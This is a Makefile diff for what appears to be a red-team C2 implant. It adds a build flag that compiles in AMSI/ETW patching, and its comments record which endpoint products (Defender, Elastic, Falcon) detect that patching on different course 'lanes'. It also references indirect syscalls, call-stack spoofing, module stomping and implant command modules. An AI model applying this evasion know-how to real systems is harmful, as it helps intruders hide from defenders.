@@ -52,6 +52,20 @@ NAX_INDIRECT_SYSCALLS ?= 0
 endif
 CFLAGS += -DNAX_INDIRECT_SYSCALLS=$(NAX_INDIRECT_SYSCALLS)
 
+# P3: AMSI/ETW userland patches (Core/Patch.c). Lane-dependent like P1/P4:
+# on the OSAI/Defender lane the patches close the userland provider feed the
+# AMSI path monitors and raise no security-DLL-integrity signal there; on the
+# CRTL/Elastic lane both Falcon/Elastic detect security-DLL .text patching
+# (and the direct-resolve lane makes no hooks to defeat), so default OFF.
+#   NAX_LANE=defender (OSAI):           NAX_ETW_PATCH=1
+#   NAX_LANE=elastic  (CRTL, default):  NAX_ETW_PATCH=0
+# Override directly: `make NAX_ETW_PATCH=1`.
+NAX_ETW_PATCH ?= 0
+ifeq ($(NAX_LANE),defender)
+NAX_ETW_PATCH ?= 1
+endif
+CFLAGS += -DNAX_ETW_PATCH=$(NAX_ETW_PATCH)
+
 # P4: call-stack spoofing of the sleepmask VirtualProtect (MVP). The beacon is
 # module-stomped (image-backed by address range, but the stomp+sleepmask writes
 # flip the .text pages PRIVATE copy-on-write). Elastic Defend resolves backing
@@ -104,7 +118,7 @@ VPATH := src:src/Core:src/Transport:src/Commands:src/Bof
 
 # Core sources (both variants)
 C_SRCS_CORE := Main.c \
-               Bootstrap.c Syscall.c Ldr.c Config.c Crypto.c Packer.c Cfg.c Helpers.c \
+               Bootstrap.c Syscall.c Patch.c Ldr.c Config.c Crypto.c Packer.c Cfg.c Helpers.c \
                Dispatch.c Whoami.c Sleep.c Core.c Bof.c \
                Screenshot.c Download.c Downloader.c Upload.c MemSave.c Ps.c \
                Loader.c Jobs.c BofStomp.c Sleepmask.c DllNotify.c Shell.c \
